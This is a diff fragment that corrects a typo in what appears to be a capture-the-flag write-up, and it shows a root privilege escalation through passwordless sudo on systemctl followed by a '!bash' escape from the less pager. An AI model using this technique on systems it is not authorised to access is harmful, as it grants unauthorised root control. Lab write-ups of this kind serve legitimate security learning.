@@ -68,7 +68,7 @@ the exploit is pretty simple and i leverage the fact that the systemctl is opene
 so we can use a classical less privesc (the script is runned as root with no password):
 	
 	sudo /usr/bin/systemctl status trail.service
-(inside the interactiv less prompt we need to write):
+(inside the interactive less prompt we need to write):
 	
 	!bash
 WE ARE NOW ROOT!!
